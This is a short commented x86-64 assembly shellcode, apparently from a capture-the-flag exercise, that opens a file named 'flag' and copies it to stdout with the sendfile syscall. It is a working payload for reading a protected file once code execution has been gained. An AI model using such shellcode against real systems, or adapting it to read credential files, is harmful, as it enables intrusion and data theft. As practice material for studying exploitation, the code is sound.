.global _start
_start:
.intel_syntax noprefix
	mov rbx, 0x0000000067616c66 # push "flag" filename
	push rbx
	mov rax, 2 # syscall number of open
	mov rdi, rsp # pointer to the top of the stack (where we have "flag")
	mov rsi, 0 # NULL out the 2nd argument (meaning, O_RDONLY)
	syscall # trigger open("flag", NULL)

	mov rdi, 1 # 1st argument to sendfile is the file descriptor to output to (stdout)
	mov rsi, rax # 2nd argument is the file descriptor returned by open
	mov rdx, 0 # 3rd argument is the number of bytes to skip from the input file
	mov r10, 1000 # 4th argument is the number of bytes to transfer to the output
	mov rax, 40 # the syscall number to sendfile
	syscall 
